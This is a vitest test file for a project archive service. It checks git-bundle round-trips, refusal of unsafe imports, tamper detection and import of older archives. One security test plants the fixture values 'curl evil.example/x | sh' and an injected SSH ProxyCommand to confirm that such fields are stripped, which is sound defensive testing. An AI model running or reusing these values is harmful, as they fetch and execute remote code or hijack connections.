import { execFile } from 'node:child_process'
import { mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'
import { afterEach, describe, expect, it } from 'vitest'
import type { Project } from '../shared/types'
import { LocalHistoryStore } from './local-history'
import { ProjectArchiveService } from './project-archive'
import { openContainer, packContainer } from './project-archive-container'

const execFileAsync = promisify(execFile)
const roots: string[] = []

async function tempDir(prefix: string): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), prefix))
  roots.push(dir)
  return dir
}

async function git(cwd: string, args: string[]): Promise<string> {
  const { stdout } = await execFileAsync(
    'git',
    ['-c', 'user.name=Archive Test', '-c', 'user.email=archive@test.invalid', ...args],
    { cwd }
  )
  return stdout
}

function project(overrides: Partial<Project>): Project {
  return {
    id: 'original-project',
    name: 'History proof',
    color: '#6750a4',
    viewport: { x: 12, y: 34, zoom: 1.2 },
    nodes: [],
    ...overrides
  }
}

/** A real repository fixture: two commits, one UNCOMMITTED modification, one untracked file, and
 *  two gitignored paths (a directory tree and a single file). */
async function makeFixtureRepo(): Promise<string> {
  const repo = await tempDir('nodeterm-archive-repo-')
  await git(repo, ['init', '-b', 'main'])
  await writeFile(path.join(repo, 'src.ts'), 'export const version = 1\n')
  await writeFile(path.join(repo, 'notes.md'), 'first draft\n')
  await writeFile(path.join(repo, '.gitignore'), 'node_modules/\nsecret.log\n')
  await git(repo, ['add', '.'])
  await git(repo, ['commit', '-m', 'first commit'])
  await writeFile(path.join(repo, 'src.ts'), 'export const version = 2\n')
  await git(repo, ['add', 'src.ts'])
  await git(repo, ['commit', '-m', 'second commit'])
  // Uncommitted working state the save file must carry:
  await writeFile(path.join(repo, 'notes.md'), 'edited but never committed\n')
  await writeFile(path.join(repo, 'untracked.txt'), 'not committed anywhere\n')
  // Ignored content the save file must EXCLUDE — and report:
  await mkdir(path.join(repo, 'node_modules', 'pkg'), { recursive: true })
  await writeFile(path.join(repo, 'node_modules', 'pkg', 'index.js'), 'module.exports = 1\n'.repeat(64))
  await writeFile(path.join(repo, 'secret.log'), 'do not ship\n')
  return repo
}

afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

describe('single-file project archives (V2 container)', () => {
  it('round-trips the WHOLE project: canvas, history, repository and uncommitted working state', async () => {
    const repo = await makeFixtureRepo()
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const source = project({ cwd: repo })

    const { bytes, contents } = await service.export(source)

    // The inclusion rule, stated: tracked + untracked-not-ignored travel; ignored is reported.
    expect(contents.repository).toBe('git-bundle')
    const included = new Set(['src.ts', 'notes.md', '.gitignore', 'untracked.txt'])
    expect(contents.workingFiles).toBe(included.size)
    const excludedPaths = contents.excluded.map((e) => e.path).sort()
    expect(excludedPaths).toEqual(['node_modules/', 'secret.log'])
    const nodeModules = contents.excluded.find((e) => e.path === 'node_modules/')!
    expect(nodeModules.reason).toBe('gitignored')
    expect(nodeModules.files).toBe(1)
    expect(nodeModules.bytes).toBeGreaterThan(0)
    expect(contents.excludedFiles).toBe(2)
    expect(contents.excludedBytes).toBeGreaterThan(0)

    const inspection = service.inspect(bytes)
    expect(inspection).toMatchObject({ archiveVersion: 2, needsDestination: true, projectName: 'History proof' })

    const dest = await tempDir('nodeterm-archive-dest-')
    const outcome = await service.import(bytes, { destination: dest })
    expect(outcome.archiveVersion).toBe(2)
    expect(outcome.restoredTo).toBe(dest)
    expect(outcome.project.id).not.toBe(source.id)
    expect(outcome.project.name).toBe(source.name)
    expect(outcome.project.cwd).toBe(dest)

    // Working files, including the uncommitted edit and the untracked file:
    expect(await readFile(path.join(dest, 'notes.md'), 'utf-8')).toBe('edited but never committed\n')
    expect(await readFile(path.join(dest, 'untracked.txt'), 'utf-8')).toBe('not committed anywhere\n')
    expect(await readFile(path.join(dest, 'src.ts'), 'utf-8')).toBe('export const version = 2\n')
    // Ignored content did NOT travel:
    expect(existsSync(path.join(dest, 'node_modules'))).toBe(false)
    expect(existsSync(path.join(dest, 'secret.log'))).toBe(false)

    // The repository came back: same history, same branch, same uncommitted status.
    const sourceLog = await git(repo, ['log', '--format=%H %s'])
    const destLog = await git(dest, ['log', '--format=%H %s'])
    expect(destLog).toBe(sourceLog)
    expect((await git(dest, ['symbolic-ref', 'HEAD'])).trim()).toBe('refs/heads/main')
    const status = await git(dest, ['status', '--porcelain'])
    expect(status).toContain(' M notes.md')
    expect(status).toContain('?? untracked.txt')
  })

  it('never carries this machine\'s exec-enabling fields (shell / terminalProfileId / ssh.extraArgs) through the file', async () => {
    // The save file is a git-shared-style document (workspace-files.ts's projectToFile), so it
    // must obey the same security boundary as project.json: a value that would choose which
    // EXECUTABLE another machine runs, or splice raw argv into one, must never round-trip through
    // it. Otherwise a save file handed to a teammate — or reopened after a machine-local profile
    // no longer exists — could silently select an unintended program.
    const repo = await makeFixtureRepo()
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const source = project({
      cwd: repo,
      nodes: [
        {
          id: 'n1',
          kind: 'terminal',
          position: { x: 0, y: 0 },
          data: { title: 'shell node' },
          shell: 'curl evil.example/x | sh',
          terminalProfileId: 'custom-profile-only-on-this-machine',
          ssh: { host: 'example.com', user: 'me', extraArgs: '-o ProxyCommand=evil' }
        } as unknown as Project['nodes'][number]
      ]
    })

    const { bytes } = await service.export(source)
    const dest = await tempDir('nodeterm-archive-exec-dest-')
    const outcome = await service.import(bytes, { destination: dest })

    const node = outcome.project.nodes.find((n) => n.id === 'n1') as unknown as Record<string, unknown>
    expect(node.shell).toBeUndefined()
    expect(node.terminalProfileId).toBeUndefined()
    expect((node.ssh as Record<string, unknown> | undefined)?.extraArgs).toBeUndefined()
  })

  it('exports an inline (cwd-less) canvas as history-only and imports it with no destination', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes, contents } = await service.export(project({}))
    expect(contents.repository).toBe('no-folder')
    expect(contents.workingFiles).toBe(0)
    expect(service.inspect(bytes).needsDestination).toBe(false)
    const outcome = await service.import(bytes)
    expect(outcome.project.name).toBe('History proof')
    expect(outcome.project.cwd).toBeUndefined()
    expect(outcome.restoredTo).toBeUndefined()
  })

  it('says plainly when the project folder is missing instead of failing the save', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { contents } = await service.export(project({ cwd: path.join(tmpdir(), 'nodeterm-gone-' + Date.now()) }))
    expect(contents.repository).toBe('folder-missing')
    expect(contents.repositoryNote).toMatch(/no longer exists/)
  })

  it('refuses to import a repository-bearing file without a destination, and into a non-empty one', async () => {
    const repo = await makeFixtureRepo()
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes } = await service.export(project({ cwd: repo }))
    await expect(service.import(bytes)).rejects.toThrow(/destination folder/)
    const dest = await tempDir('nodeterm-archive-dest-')
    await writeFile(path.join(dest, 'existing.txt'), 'already here\n')
    await expect(service.import(bytes, { destination: dest })).rejects.toThrow(/not empty/)
    // Nothing was touched — import never overwrites:
    expect(await readFile(path.join(dest, 'existing.txt'), 'utf-8')).toBe('already here\n')
  })

  it('refuses an archive whose snapshot was changed outside the bundled history', async () => {
    const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
    const { bytes } = await service.export(project({}))
    const entries = openContainer(bytes, {
      maxArchiveBytes: 1024 * 1024 * 1024,
      maxTotalBytes: 2 * 1024 * 1024 * 1024,
      maxEntryBytes: 2 * 1024 * 1024 * 1024,
      maxEntries: 65_500
    })
    const snapshot = JSON.parse(entries.get('project.json')!.toString('utf-8'))
    snapshot.name = 'Tampered'
    entries.set('project.json', Buffer.from(JSON.stringify(snapshot, null, 2), 'utf-8'))
    const forged = packContainer([...entries.entries()].map(([p, data]) => ({ path: p, data })))
    await expect(service.import(forged)).rejects.toThrow(/does not match/)
  })

  it('still imports a V1 JSON archive and says it carried no repository', async () => {
    const dataDir = await tempDir('nodeterm-archive-data-')
    const history = new LocalHistoryStore(dataDir)
    const service = new ProjectArchiveService(history)
    // Construct a V1 archive exactly as the pre-container exporter wrote it.
    const source = project({})
    const { projectToFile, serializeProjectFile } = await import('./workspace-files')
    const snapshot = projectToFile(source, 0, new Date().toISOString())
    await history.record({
      domain: `project_${source.id}`,
      filename: 'project.json',
      content: serializeProjectFile(snapshot),
      label: 'Exported project',
      action: 'updated'
    })
    const bundle = await history.exportBundle(`project_${source.id}`)
    const v1 = JSON.stringify({
      schemaVersion: 1,
      exportedAt: new Date().toISOString(),
      project: snapshot,
      history: { format: 'git-bundle-base64', bytes: bundle!.toString('base64') }
    })

    const outcome = await service.import(Buffer.from(v1, 'utf-8'))
    expect(outcome.archiveVersion).toBe(1)
    expect(outcome.project.name).toBe('History proof')
    expect(outcome.contents.repository).toBe('not-in-archive')
    expect(outcome.contents.repositoryNote).toMatch(/older nodeterm/)
    expect(service.inspect(Buffer.from(v1, 'utf-8'))).toEqual({ archiveVersion: 1, needsDestination: false })
  })
})
